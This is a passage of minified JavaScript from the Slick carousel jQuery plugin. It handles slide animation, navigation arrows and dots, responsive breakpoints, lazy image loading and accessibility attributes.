t?0===t&&0===s.$slides.length?i(e).appendTo(s.$slideTrack):o?i(e).insertBefore(s.$slides.eq(t)):i(e).insertAfter(s.$slides.eq(t)):!0===o?i(e).prependTo(s.$slideTrack):i(e).appendTo(s.$slideTrack),s.$slides=s.$slideTrack.children(this.options.slide),s.$slideTrack.children(this.options.slide).detach(),s.$slideTrack.append(s.$slides),s.$slides.each(function(e,t){i(t).attr("data-slick-index",e)}),s.$slidesCache=s.$slides,s.reinit()},e.prototype.animateHeight=function(){var i=this;if(1===i.options.slidesToShow&&!0===i.options.adaptiveHeight&&!1===i.options.vertical){var e=i.$slides.eq(i.currentSlide).outerHeight(!0);i.$list.animate({height:e},i.options.speed)}},e.prototype.animateSlide=function(e,t){var o={},s=this;s.animateHeight(),!0===s.options.rtl&&!1===s.options.vertical&&(e=-e),!1===s.transformsEnabled?!1===s.options.vertical?s.$slideTrack.animate({left:e},s.options.speed,s.options.easing,t):s.$slideTrack.animate({top:e},s.options.speed,s.options.easing,t):!1===s.cssTransitions?(!0===s.options.rtl&&(s.currentLeft=-s.currentLeft),i({animStart:s.currentLeft}).animate({animStart:e},{duration:s.options.speed,easing:s.options.easing,step:function(i){i=Math.ceil(i),!1===s.options.vertical?(o[s.animType]="translate("+i+"px, 0px)",s.$slideTrack.css(o)):(o[s.animType]="translate(0px,"+i+"px)",s.$slideTrack.css(o))},complete:function(){t&&t.call()}})):(s.applyTransition(),e=Math.ceil(e),!1===s.options.vertical?o[s.animType]="translate3d("+e+"px, 0px, 0px)":o[s.animType]="translate3d(0px,"+e+"px, 0px)",s.$slideTrack.css(o),t&&setTimeout(function(){s.disableTransition(),t.call()},s.options.speed))},e.prototype.getNavTarget=function(){var e=this,t=e.options.asNavFor;return t&&null!==t&&(t=i(t).not(e.$slider)),t},e.prototype.asNavFor=function(e){var t=this.getNavTarget();null!==t&&"object"==typeof t&&t.each(function(){var t=i(this).slick("getSlick");t.unslicked||t.slideHandler(e,!0)})},e.prototype.applyTransition=function(i){var e=this,t={};!1===e.options.fade?t[e.transitionType]=e.transformType+" "+e.options.speed+"ms "+e.options.cssEase:t[e.transitionType]="opacity "+e.options.speed+"ms "+e.options.cssEase,!1===e.options.fade?e.$slideTrack.css(t):e.$slides.eq(i).css(t)},e.prototype.autoPlay=function(){var i=this;i.autoPlayClear(),i.slideCount>i.options.slidesToShow&&(i.autoPlayTimer=setInterval(i.autoPlayIterator,i.options.autoplaySpeed))},e.prototype.autoPlayClear=function(){var i=this;i.autoPlayTimer&&clearInterval(i.autoPlayTimer)},e.prototype.autoPlayIterator=function(){var i=this,e=i.currentSlide+i.options.slidesToScroll;i.paused||i.interrupted||i.focussed||(!1===i.options.infinite&&(1===i.direction&&i.currentSlide+1===i.slideCount-1?i.direction=0:0===i.direction&&(e=i.currentSlide-i.options.slidesToScroll,i.currentSlide-1==0&&(i.direction=1))),i.slideHandler(e))},e.prototype.buildArrows=function(){var e=this;!0===e.options.arrows&&(e.$prevArrow=i(e.options.prevArrow).addClass("slick-arrow"),e.$nextArrow=i(e.options.nextArrow).addClass("slick-arrow"),e.slideCount>e.options.slidesToShow?(e.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),e.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),e.htmlExpr.test(e.options.prevArrow)&&e.$prevArrow.prependTo(e.options.appendArrows),e.htmlExpr.test(e.options.nextArrow)&&e.$nextArrow.appendTo(e.options.appendArrows),!0!==e.options.infinite&&e.$prevArrow.addClass("slick-disabled").attr("aria-disabled","true")):e.$prevArrow.add(e.$nextArrow).addClass("slick-hidden").attr({"aria-disabled":"true",tabindex:"-1"}))},e.prototype.buildDots=function(){var e,t,o=this;if(!0===o.options.dots){for(o.$slider.addClass("slick-dotted"),t=i("<ul />").addClass(o.options.dotsClass),e=0;e<=o.getDotCount();e+=1)t.append(i("<li />").append(o.options.customPaging.call(this,o,e)));o.$dots=t.appendTo(o.options.appendDots),o.$dots.find("li").first().addClass("slick-active")}},e.prototype.buildOut=function(){var e=this;e.$slides=e.$slider.children(e.options.slide+":not(.slick-cloned)").addClass("slick-slide"),e.slideCount=e.$slides.length,e.$slides.each(function(e,t){i(t).attr("data-slick-index",e).data("originalStyling",i(t).attr("style")||"")}),e.$slider.addClass("slick-slider"),e.$slideTrack=0===e.slideCount?i('<div class="slick-track"/>').appendTo(e.$slider):e.$slides.wrapAll('<div class="slick-track"/>').parent(),e.$list=e.$slideTrack.wrap('<div class="slick-list"/>').parent(),e.$slideTrack.css("opacity",0),!0!==e.options.centerMode&&!0!==e.options.swipeToSlide||(e.options.slidesToScroll=1),i("img[data-lazy]",e.$slider).not("[src]").addClass("slick-loading"),e.setupInfinite(),e.buildArrows(),e.buildDots(),e.updateDots(),e.setSlideClasses("number"==typeof e.currentSlide?e.currentSlide:0),!0===e.options.draggable&&e.$list.addClass("draggable")},e.prototype.buildRows=function(){var i,e,t,o,s,n,r,l=this;if(o=document.createDocumentFragment(),n=l.$slider.children(),l.options.rows>1){for(r=l.options.slidesPerRow*l.options.rows,s=Math.ceil(n.length/r),i=0;i<s;i++){var d=document.createElement("div");for(e=0;e<l.options.rows;e++){var a=document.createElement("div");for(t=0;t<l.options.slidesPerRow;t++){var c=i*r+(e*l.options.slidesPerRow+t);n.get(c)&&a.appendChild(n.get(c))}d.appendChild(a)}o.appendChild(d)}l.$slider.empty().append(o),l.$slider.children().children().children().css({width:100/l.options.slidesPerRow+"%",display:"inline-block"})}},e.prototype.checkResponsive=function(e,t){var o,s,n,r=this,l=!1,d=r.$slider.width(),a=window.innerWidth||i(window).width();if("window"===r.respondTo?n=a:"slider"===r.respondTo?n=d:"min"===r.respondTo&&(n=Math.min(a,d)),r.options.responsive&&r.options.responsive.length&&null!==r.options.responsive){s=null;for(o in r.breakpoints)r.breakpoints.hasOwnProperty(o)&&(!1===r.originalSettings.mobileFirst?n<r.breakpoints[o]&&(s=r.breakpoints[o]):n>r.breakpoints[o]&&(s=r.breakpoints[o]));null!==s?null!==r.activeBreakpoint?(s!==r.activeBreakpoint||t)&&(r.activeBreakpoint=s,"unslick"===r.breakpointSettings[s]?r.unslick(s):(r.options=i.extend({},r.originalSettings,r.breakpointSettings[s]),!0===e&&(r.currentSlide=r.options.initialSlide),r.refresh(e)),l=s):(r.activeBreakpoint=s,"unslick"===r.breakpointSettings[s]?r.unslick(s):(r.options=i.extend({},r.originalSettings,r.breakpointSettings[s]),!0===e&&(r.currentSlide=r.options.initialSlide),r.refresh(e)),l=s):null!==r.activeBreakpoint&&(r.activeBreakpoint=null,r.options=r.originalSettings,!0===e&&(r.currentSlide=r.options.initialSlide),r.refresh(e),l=s),e||!1===l||r.$slider.trigger("breakpoint",[r,l])}},e.prototype.changeSlide=function(e,t){var o,s,n,r=this,l=i(e.currentTarget);switch(l.is("a")&&e.preventDefault(),l.is("li")||(l=l.closest("li")),n=r.slideCount%r.options.slidesToScroll!=0,o=n?0:(r.slideCount-r.currentSlide)%r.options.slidesToScroll,e.data.message){case"previous":s=0===o?r.options.slidesToScroll:r.options.slidesToShow-o,r.slideCount>r.options.slidesToShow&&r.slideHandler(r.currentSlide-s,!1,t);break;case"next":s=0===o?r.options.slidesToScroll:o,r.slideCount>r.options.slidesToShow&&r.slideHandler(r.currentSlide+s,!1,t);break;case"index":var d=0===e.data.index?0:e.data.index||l.index()*r.options.slidesToScroll;r.slideHandler(r.checkNavigable(d),!1,t),l.children().trigger("focus");break;default:return}},e.prototype.checkNavigable=function(i){var e,t;if(e=this.getNavigableIndexes(),t=0,i>e[e.length-1])i=e[e.length-1];else for(var o in e){if(i<e[o]){i=t;break}t=e[o]}return i},e.prototype.cleanUpEvents=function(){var e=this;e.options.dots&&null!==e.$dots&&(i("li",e.$dots).off("click.slick",e.changeSlide).off("mouseenter.slick",i.proxy(e.interrupt,e,!0)).off("mouseleave.slick",i.proxy(e.interrupt,e,!1)),!0===e.options.accessibility&&e.$dots.off("keydown.slick",e.keyHandler)),e.$slider.off("focus.slick blur.slick"),!0===e.options.arrows&&e.slideCount>e.options.slidesToShow&&(e.$prevArrow&&e.$prevArrow.off("click.slick",e.changeSlide),e.$nextArrow&&e.$nextArrow.off("click.slick",e.changeSlide),!0===e.options.accessibility&&(e.$prevArrow&&e.$prevArrow.off("keydown.slick",e.keyHandler),e.$nextArrow&&e.$nextArrow.off("keydown.slick",e.keyHandler))),e.$list.off("touchstart.slick mousedown.slick",e.swipeHandler),e.$list.off("touchmove.slick mousemove.slick",e.swipeHandler),e.$list.off("touchend.slick mouseup.slick",e.swipeHandler),e.$list.off("touchcancel.slick mouseleave.slick",e.swipeHandler),e.$list.off("click.slick",e.clickHandler),i(document).off(e.visibilityChange,e.visibility),e.cleanUpSlideEvents(),!0===e.options.accessibility&&e.$list.off("keydown.slick",e.keyHandler),!0===e.options.focusOnSelect&&i(e.$slideTrack).children().off("click.slick",e.selectHandler),i(window).off("orientationchange.slick.slick-"+e.instanceUid,e.orientationChange),i(window).off("resize.slick.slick-"+e.instanceUid,e.resize),i("[draggable!=true]",e.$slideTrack).off("dragstart",e.preventDefault),i(window).off("load.slick.slick-"+e.instanceUid,e.setPosition)},e.prototype.cleanUpSlideEvents=function(){var e=this;e.$list.off("mouseenter.slick",i.proxy(e.interrupt,e,!0)),e.$list.off("mouseleave.slick",i.proxy(e.interrupt,e,!1))},e.prototype.cleanUpRows=function(){var i,e=this;e.options.rows>1&&((i=e.$slides.children().children()).removeAttr("style"),e.$slider.empty().append(i))},e.prototype.clickHandler=function(i){!1===this.shouldClick&&(i.stopImmediatePropagation(),i.stopPropagation(),i.preventDefault())},e.prototype.destroy=function(e){var t=this;t.autoPlayClear(),t.touchObject={},t.cleanUpEvents(),i(".slick-cloned",t.$slider).detach(),t.$dots&&t.$dots.remove(),t.$prevArrow&&t.$prevArrow.length&&(t.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display",""),t.htmlExpr.test(t.options.prevArrow)&&t.$prevArrow.remove()),t.$nextArrow&&t.$nextArrow.length&&(t.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display",""),t.htmlExpr.test(t.options.nextArrow)&&t.$nextArrow.remove()),t.$slides&&(t.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function(){i(this).attr("style",i(this).data("originalStyling"))}),t.$slideTrack.children(this.options.slide).detach(),t.$slideTrack.detach(),t.$list.detach(),t.$slider.append(t.$slides)),t.cleanUpRows(),t.$slider.removeClass("slick-slider"),t.$slider.removeClass("slick-initialized"),t.$slider.removeClass("slick-dotted"),t.unslicked=!0,e||t.$slider.trigger("destroy",[t])},e.prototype.disableTransition=function(i){var e=this,t={};t[e.transitionType]="",!1===e.options.fade?e.$slideTrack.css(t):e.$slides.eq(i).css(t)},e.prototype.fadeSlide=function(i,e){var t=this;!1===t.cssTransitions?(t.$slides.eq(i).css({zIndex:t.options.zIndex}),t.$slides.eq(i).animate({opacity:1},t.options.speed,t.options.easing,e)):(t.applyTransition(i),t.$slides.eq(i).css({opacity:1,zIndex:t.options.zIndex}),e&&setTimeout(function(){t.disableTransition(i),e.call()},t.options.speed))},e.prototype.fadeSlideOut=function(i){var e=this;!1===e.cssTransitions?e.$slides.eq(i).animate({opacity:0,zIndex:e.options.zIndex-2},e.options.speed,e.options.easing):(e.applyTransition(i),e.$slides.eq(i).css({opacity:0,zIndex:e.options.zIndex-2}))},e.prototype.filterSlides=e.prototype.slickFilter=function(i){var e=this;null!==i&&(e.$slidesCache=e.$slides,e.unload(),e.$slideTrack.children(this.options.slide).detach(),e.$slidesCache.filter(i).appendTo(e.$slideTrack),e.reinit())},e.prototype.focusHandler=function(){var e=this;e.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick","*",function(t){t.stopImmediatePropagation();var o=i(this);setTimeout(function(){e.options.pauseOnFocus&&(e.focussed=o.is(":focus"),e.autoPlay())},0)})},e.prototype.getCurrent=e.prototype.slickCurrentSlide=function(){return this.currentSlide},e.prototype.getDotCount=function(){var i=this,e=0,t=0,o=0;if(!0===i.options.infinite)if(i.slideCount<=i.options.slidesToShow)++o;else for(;e<i.slideCount;)++o,e=t+i.options.slidesToScroll,t+=i.options.slidesToScroll<=i.options.slidesToShow?i.options.slidesToScroll:i.options.slidesToShow;else if(!0===i.options.centerMode)o=i.slideCount;else if(i.options.asNavFor)for(;e<i.slideCount;)++o,e=t+i.options.slidesToScroll,t+=i.options.slidesToScroll<=i.options.slidesToShow?i.options.slidesToScroll:i.options.slidesToShow;else o=1+Math.ceil((i.slideCount-i.options.slidesToShow)/i.options.slidesToScroll);return o-1},e.prototype.getLeft=function(i){var e,t,o,s,n=this,r=0;return n.slideOffset=0,t=n.$slides.first().outerHeight(!0),!0===n.options.infinite?(n.slideCount>n.options.slidesToShow&&(n.slideOffset=n.slideWidth*n.options.slidesToShow*-1,s=-1,!0===n.options.vertical&&!0===n.options.centerMode&&(2===n.options.slidesToShow?s=-1.5:1===n.options.slidesToShow&&(s=-2)),r=t*n.options.slidesToShow*s),n.slideCount%n.options.slidesToScroll!=0&&i+n.options.slidesToScroll>n.slideCount&&n.slideCount>n.options.slidesToShow&&(i>n.slideCount?(n.slideOffset=(n.options.slidesToShow-(i-n.slideCount))*n.slideWidth*-1,r=(n.options.slidesToShow-(i-n.slideCount))*t*-1):(n.slideOffset=n.slideCount%n.options.slidesToScroll*n.slideWidth*-1,r=n.slideCount%n.options.slidesToScroll*t*-1))):i+n.options.slidesToShow>n.slideCount&&(n.slideOffset=(i+n.options.slidesToShow-n.slideCount)*n.slideWidth,r=(i+n.options.slidesToShow-n.slideCount)*t),n.slideCount<=n.options.slidesToShow&&(n.slideOffset=0,r=0),!0===n.options.centerMode&&n.slideCount<=n.options.slidesToShow?n.slideOffset=n.slideWidth*Math.floor(n.options.slidesToShow)/2-n.slideWidth*n.slideCount/2:!0===n.options.centerMode&&!0===n.options.infinite?n.slideOffset+=n.slideWidth*Math.floor(n.options.slidesToShow/2)-n.slideWidth:!0===n.options.centerMode&&(n.slideOffset=0,n.slideOffset+=n.slideWidth*Math.floor(n.options.slidesToShow/2)),e=!1===n.options.vertical?i*n.slideWidth*-1+n.slideOffset:i*t*-1+r,!0===n.options.variableWidth&&(o=n.slideCount<=n.options.slidesToShow||!1===n.options.infinite?n.$slideTrack.children(".slick-slide").eq(i):n.$slideTrack.children(".slick-slide").eq(i+n.options.slidesToShow),e=!0===n.options.rtl?o[0]?-1*(n.$slideTrack.width()-o[0].offsetLeft-o.width()):0:o[0]?-1*o[0].offsetLeft:0,!0===n.options.centerMode&&(o=n.slideCount<=n.options.slidesToShow||!1===n.options.infinite?n.$slideTrack.children(".slick-slide").eq(i):n.$slideTrack.children(".slick-slide").eq(i+n.options.slidesToShow+1),e=!0===n.options.rtl?o[0]?-1*(n.$slideTrack.width()-o[0].offsetLeft-o.width()):0:o[0]?-1*o[0].offsetLeft:0,e+=(n.$list.width()-o.outerWidth())/2)),e},e.prototype.getOption=e.prototype.slickGetOption=function(i){return this.options[i]},e.prototype.getNavigableIndexes=function(){var i,e=this,t=0,o=0,s=[];for(!1===e.options.infinite?i=e.slideCount:(t=-1*e.options.slidesToScroll,o=-1*e.options.slidesToScroll,i=2*e.slideCount);t<i;)s.push(t),t=o+e.options.slidesToScroll,o+=e.options.slidesToScroll<=e.options.slidesToShow?e.options.slidesToScroll:e.options.slidesToShow;return s},e.prototype.getSlick=function(){return this},e.prototype.getSlideCount=function(){var e,t,o=this;return t=!0===o.options.centerMode?o.slideWidth*Math.floor(o.options.slidesToShow/2):0,!0===o.options.swipeToSlide?(o.$slideTrack.find(".slick-slide").each(function(s,n){if(n.offsetLeft-t+i(n).outerWidth()/2>-1*o.swipeLeft)return e=n,!1}),Math.abs(i(e).attr("data-slick-index")-o.currentSlide)||1):o.options.slidesToScroll},e.prototype.goTo=e.prototype.slickGoTo=function(i,e){this.changeSlide({data:{message:"index",index:parseInt(i)}},e)},e.prototype.init=function(e){var t=this;i(t.$slider).hasClass("slick-initialized")||(i(t.$slider).addClass("slick-initialized"),t.buildRows(),t.buildOut(),t.setProps(),t.startLoad(),t.loadSlider(),t.initializeEvents(),t.updateArrows(),t.updateDots(),t.checkResponsive(!0),t.focusHandler()),e&&t.$slider.trigger("init",[t]),!0===t.options.accessibility&&t.initADA(),t.options.autoplay&&(t.paused=!1,t.autoPlay())},e.prototype.initADA=function(){var e=this,t=Math.ceil(e.slideCount/e.options.slidesToShow),o=e.getNavigableIndexes().filter(function(i){return i>=0&&i<e.slideCount});e.$slides.add(e.$slideTrack.find(".slick-cloned")).attr({"aria-hidden":"true",tabindex:"-1"}).find("a, input, button, select").attr({tabindex:"-1"}),null!==e.$dots&&(e.$slides.not(e.$slideTrack.find(".slick-cloned")).each(function(t){var s=o.indexOf(t);i(this).attr({role:"tabpanel",id:"slick-slide"+e.instanceUid+t,tabindex:-1}),-1!==s&&i(this).attr({"aria-describedby":"slick-slide-control"+e.instanceUid+s})}),e.$dots.attr("role","tablist").find("li").each(function(s){var n=o[s];i(this).attr({role:"presentation"}),i(this).find("button").first().attr({role:"tab",id:"slick-slide-control"+e.instanceUid+s,"aria-controls":"slick-slide"+e.instanceUid+n,"aria-label":s+1+" of "+t,"aria-selected":null,tabindex:"-1"})}).eq(e.currentSlide).find("button").attr({"aria-selected":"true",tabindex:"0"}).end());for(var s=e.currentSlide,n=s+e.options.slidesToShow;s<n;s++)e.$slides.eq(s).attr("tabindex",0);e.activateADA()},e.prototype.initArrowEvents=function(){var i=this;!0===i.options.arrows&&i.slideCount>i.options.slidesToShow&&(i.$prevArrow.off("click.slick").on("click.slick",{message:"previous"},i.changeSlide),i.$nextArrow.off("click.slick").on("click.slick",{message:"next"},i.changeSlide),!0===i.options.accessibility&&(i.$prevArrow.on("keydown.slick",i.keyHandler),i.$nextArrow.on("keydown.slick",i.keyHandler)))},e.prototype.initDotEvents=function(){var e=this;!0===e.options.dots&&(i("li",e.$dots).on("click.slick",{message:"index"},e.changeSlide),!0===e.options.accessibility&&e.$dots.on("keydown.slick",e.keyHandler)),!0===e.options.dots&&!0===e.options.pauseOnDotsHover&&i("li",e.$dots).on("mouseenter.slick",i.proxy(e.interrupt,e,!0)).on("mouseleave.slick",i.proxy(e.interrupt,e,!1))},e.prototype.initSlideEvents=function(){var e=this;e.options.pauseOnHover&&(e.$list.on("mouseenter.slick",i.proxy(e.interrupt,e,!0)),e.$list.on("mouseleave.slick",i.proxy(e.interrupt,e,!1)))},e.prototype.initializeEvents=function(){var e=this;e.initArrowEvents(),e.initDotEvents(),e.initSlideEvents(),e.$list.on("touchstart.slick mousedown.slick",{action:"start"},e.swipeHandler),e.$list.on("touchmove.slick mousemove.slick",{action:"move"},e.swipeHandler),e.$list.on("touchend.slick mouseup.slick",{action:"end"},e.swipeHandler),e.$list.on("touchcancel.slick mouseleave.slick",{action:"end"},e.swipeHandler),e.$list.on("click.slick",e.clickHandler),i(document).on(e.visibilityChange,i.proxy(e.visibility,e)),!0===e.options.accessibility&&e.$list.on("keydown.slick",e.keyHandler),!0===e.options.focusOnSelect&&i(e.$slideTrack).children().on("click.slick",e.selectHandler),i(window).on("orientationchange.slick.slick-"+e.instanceUid,i.proxy(e.orientationChange,e)),i(window).on("resize.slick.slick-"+e.instanceUid,i.proxy(e.resize,e)),i("[draggable!=true]",e.$slideTrack).on("dragstart",e.preventDefault),i(window).on("load.slick.slick-"+e.instanceUid,e.setPosition),i(e.setPosition)},e.prototype.initUI=function(){var i=this;!0===i.options.arrows&&i.slideCount>i.options.slidesToShow&&(i.$prevArrow.show(),i.$nextArrow.show()),!0===i.options.dots&&i.slideCount>i.options.slidesToShow&&i.$dots.show()},e.prototype.keyHandler=function(i){var e=this;i.target.tagName.match("TEXTAREA|INPUT|SELECT")||(37===i.keyCode&&!0===e.options.accessibility?e.changeSlide({data:{message:!0===e.options.rtl?"next":"previous"}}):39===i.keyCode&&!0===e.options.accessibility&&e.changeSlide({data:{message:!0===e.options.rtl?"previous":"next"}}))},e.prototype.lazyLoad=function(){function e(e){i("img[data-lazy]",e).each(function(){var e=i(this),t=i(this).attr("data-lazy"),o=i(this).attr("data-srcset"),s=i(this).attr("data-sizes")||n.$slider.attr("data-sizes"),r=document.createElement("img");r.onload=function(){e.animate({opacity:0},100,function(){o&&(e.attr("srcset",o),s&&e.attr("sizes",s)),e.attr("src",t).animate({opacity:1},200,function(){e.removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading")}),n.$slider.trigger("lazyLoaded",[n,e,t])})},r.onerror=function(){e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),n.$slider.trigger("lazyLoadError",[n,e,t])},r.src=t})}var t,o,s,n=this;if(!0===n.options.centerMode?!0===n.options.infinite?s=(o=n.currentSlide+(n.options.slidesToShow/2+1))+n.options.slidesToShow+2:(o=Math.max(0,n.currentSlide-(n.options.slidesToShow/2+1)),s=n.options.slidesToShow/2+1+2+n.currentSlide):(o=n.options.infinite?n.options.slidesToShow+n.currentSlide:n.currentSlide,s=Math.ceil(o+n.options.slidesToShow),!0===n.options.fade&&(o>0&&o--,s<=n.slideCount&&s++)),t=n.$slider.find(".slick-slide").slice(o,s),"anticipated"===n.options.lazyLoad)for(var r=o-1,l=s,d=n.$slider.find(".slick-slide"),a=0;a<n.options.slidesToScroll;a++)r<0&&(r=n.slideCount-1),t=(t=t.add(d.eq(r))).add(d.eq(l)),r--,l++;e(t),n.slideCount<=n.options.slidesToShow?e(n.$slider.find(".slick-slide")):n.currentSlide>=n.slideCount-n.options.slidesToShow?e(n.$slider.find(".slick-cloned").slice(0,n.options.slidesToShow)):0===n.currentSlide&&e(n.$slider.find(".slick-cloned").slice(-1*n.options.slidesToShow))},e.prototype.loadSlider=function(){var i=this;i.setPosition(),i.$slideTrack.css({opacity:1}),i.$slider.removeClass("slick-loading"),i.initUI(),"progressive"===i.options.lazyLoad&&i.progressiveLazyLoad()},e.prototype.next=e.prototype.slickNext=function(){this.changeSlide({data:{message:"next"}})},e.prototype.orientationChange=function(){var i=this;i.checkResponsive(),i.setPosition()},e.prototype.pause=e.prototype.slickPause=function(){var i=this;i.autoPlayClear(),i.paused=!0},e.prototype.play=e.prototype.slickPlay=function(){var i=this;i.autoPlay(),i.options.autoplay=!0,i.paused=!1,i.focussed=!1,i.interrupted=!1},e.prototype.postSlide=function(e){var t=this;t.unslicked||(t.$slider.trigger("afterChange",[t,e]),t.animating=!1,t.slideCount>t.options.slidesToShow&&t.setPosition(),t.swipeLeft=null,t.options.autoplay&&t.autoPlay(),!0===t.options.accessibility&&(t.initADA(),t.options.focusOnChange&&i(t.$slides.get(t.currentSlide)).attr("tabindex",0).focus()))},e.prototype.prev=e.prototype.slickPrev=function(){this.changeSlide({data:{message:"previous"}})},e.prototype.preventDefault=function(i){i.preventDefault()},e.prototype.progressiveLazyLoad=function(e){e=e||1;var t,o,s,n,r,l=this,d=i("img[data-lazy]",l.$slider);d.length?(t=d.first(),o=t.attr("data-lazy"),s=t.attr("data-srcset"),n=t.attr("data-sizes")||l.$slider.attr("data-sizes"),(r=document.createElement("img")).onload=function(){s&&(t.attr("srcset",s),n&&t.attr("sizes",n)),t.attr("src",o).removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading"),!0===l.options.adaptiveHeight&&l.setPosition(),l.$slider.trigger("lazyLoaded",[l,t,o]),l.progressiveLazyLoad()},r.onerror=function(){e<3?setTimeout(function(){l.progressiveLazyLoad(e+1)},500):(t.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),l.$slider.trigger("lazyLoadError",[l,t,o]),l.progressiveLazyLoad())},r.src=o):l.$slider.trigger("allImagesLoaded",[l])},e.prototype.refresh=function(e){var t,o,s=this;o=s.slideCount-s.options.slidesToShow,!s.options.infinite&&s.currentSlide>o&&(s.currentSlide=o),s.slideCount<=s.options.slidesToShow&&(s.currentSlide=0),t=s.currentSlide,s.destroy(!0),i.extend(s,s.initials,{currentSlide:t}),s.init(),e||s.changeSlide({data:{message:"index",index:t}},!1)},e.prototype.registerBreakpoints=function(){var e,t,o,s=this,n=s.options.responsive||null;if("array"===i.type(n)&&n.length){s.respondTo=s.options.respondTo||"window";for(e in n)if(o=s.breakpoints.length-1,n.hasOwnProperty(e)){for(t=n[e].breakpoint;o>=0;)s.breakpoints[o]&&s.breakpoints[o]===t&&s.breakpoints.splice(o,1),o--;s.breakpoints.push(t),s.breakpointSettings[t]=n[e].settings}s.breakpoints.sort(function(i,e){return s.options.mobileFirst?i-e:e-i})}},e.prototype.reinit=function(){var e=this;e.$slides=e.$slideTrack.children(e.options.slide).addClass("slick-slide"),e.slideCount=e.$slides.length,e.currentSlide>=e.slideCount&&0!==e.currentSlide&&(e.currentSlide=e.currentSlide-e.options.slidesToScroll),e.slideCount<=e.options.slidesToShow&&(e.currentSlide=0),e.registerBreakpoints(),e.setProps(),e.setupInfinite(),e.buildArrows(),e.updateArrows(),e.initArrowEvents(),e.buildDots(),e.updateDots(),e.initDotEvents(),e.cleanUpSlideEvents(),e.initSlideEvents(),e.checkResponsive(!1,!0),!0===e.options.focusOnSelect&&i(e.$slideTrack).children().on("click.slick",e.selectHandler),e.setSlideClasses("number"==typeof e.currentSlide?e.currentSlide:0),e.setPosition(),e.focusHandler(),e.paused=!e.options.autoplay,e.autoPlay(),e.$slider.trigger("reInit",[e])},e.prototype.resize=function(){var e=this;i(window).width()!==e.windowWidth&&(clearTimeout(e.windowDelay),e.windowDelay=window.setTimeout(function(){e.windowWidth=i(window).width(),e.checkResponsive(),e.unslicked||e.setPosition()},50))},e.prototype.removeSlide=e.prototype.slickRemove=function(i,e,t){var o=this;if(i="boolean"==typeof i?!0===(e=i)?0:o.slideCount-1:!0===e?--i:i,o.slideCount<1||i<0||i>o.slideCount-1)return!1;o.unload(),!0===t?o.$slideTrack.children().remove():o.$slideTrack.children(this.options.slide).eq(i).remove(),o.$slides=o.$slideTrack.children(this.options.slide),o.$slideTrack.children(this.options.slide).detach(),o.$slideTrack.append(o.$slides),o.$slidesCache=o.$slides,o.reinit()},e.prototype.setCSS=function(i){var e,t,o=this,s={};!0===o.options.rtl&&(i=-i),e="left"==o.positionProp?Math.ceil(i)+"px":"0px",t="top"==o.positionProp?Math.ceil(i)+"px":"0px",s[o.positionProp]=i,!1===o.transformsEnabled?o.$slideTrack.css(s):(s={},!1===o.cssTransitions?(s[o.animType]="translate("+e+", "+t+")",o.$slideTrack.css(s)):(s[o.animType]="translate3d("+e+", "+t+", 0px)",o.$slideTrack.css(s)))},e.prototype.setDimensions=function(){var i=this;!1===i.options.vertical?!0===i.options.centerMode&&i.$list.css({padding:"0px "+i.options.centerPadding}):(i.$list.height(i.$slides.first().outerHeight(!0)*i.options.slidesToShow),!0===i.options.centerMode&&i.$list.css({padding:i.options.centerPadding+" 0px"})),i.listWidth=i.$list.width(),i.listHeight=i.$list.height(),!1===i.options.vertical&&!1===i.options.variableWidth?(i.slideWidth=Math.ceil(i.listWidth/i.options.slidesToShow),i.$slideTrack.width(Math.ceil(i.slideWidth*i.$slideTrack.children(".slick-slide").length))):!0===i.options.variableWidth?i.$slideTrack.width(5e3*i.slideCount):(i.slideWidth=Math.ceil(i.listWidth),i.$slideTrack.height(Math.ceil(i.$slides.first().outerHeight(!0)*i.$slideTrack.children(".slick-slide").length)));var e=i.$slides.first().outerWidth(!0)-i.$slides.first().width();!1===i.options.variableWidth&&i.$slideTrack.children(".slick-slide").width(i.slideWidth-e)},e.prototype.setFade=function(){var e,t=this;t.$slides.each(function(o,s){e=t.slideWidth*o*-1,!0===t.options.rtl?i(s).css({position:"relative",right:e,top:0,zIndex:t.options.zIndex-2,opacity:0}):i(s).css({position:"relative",left:e,top:0,zIndex:t.options.zIndex-2,opacity:0})}),t.$slides.eq(t.currentSlide).css({zIndex:t.options.zIndex-1,opacity:1})},e.prototype.setHeight=function(){var i=this;if(1===i.options.slidesToShow&&!0===i.options.adaptiveHeight&&!1===i.options.vertical){var e=i.$slides.eq(i.currentSlide).outerHeight(!0);i.$list.css("height",e)}},e.prototype.setOption=e.prototype.slickSetOption=function(){var e,t,o,s,n,r=this,l=!1;if("object"===i.type(arguments[0])?(o=arguments[0],l=arguments[1],n="multiple"):"string"===i.type(arguments[0])&&(o=arguments[0],s=arguments[1],l=arguments[2],"responsive"===arguments[0]&&"array"===i.type(arguments[1])?n="responsive":void 0!==arguments[1]&&(n="single")),"single"===n)r.options[o]=s;else if("multiple"===n)i.each(o,function(i,e){r.options[i]=e});else if("responsive"===n)for(t in s)if("array"!==i.type(r.options.responsive))r.options.responsive=[s[t]];else{for(e=r.options.responsive.length-1;e>=0;)r.options.responsive[e].breakpoint===s[t].breakpoint&&r.options.responsive.splice(e,1),e--;r.options.responsive.push(s[t])}l&&(r.unload(),r.reinit())},e.prototype.setPosition=function(){var i=this;i.setDimensions(),i.setHeight(),!1===i.options.fade?i.setCSS(i.getLeft(i.currentSlide)):i.setFade(),i.$slider.trigger("setPosition",[i])},e.prototype.setProps=function(){var i=this,e=document.body.style;i.positionProp=!0===i.options.vertical?"top":"left","top"===i.positionProp?i.$slider.addClass("slick-vertical"):i.$slider.removeClass("slick-vertical"),void 0===e.WebkitTransition&&void 0===e.MozTransition&&void 0===e.msTransition||!0===i.options.useCSS&&(i.cssTransitions=!0),i.options.fade&&("number"==typeof i.options.zIndex?i.options.zIndex<3&&(i.options.zIndex=3):i.options.zIndex=i.defaults.zIndex),void 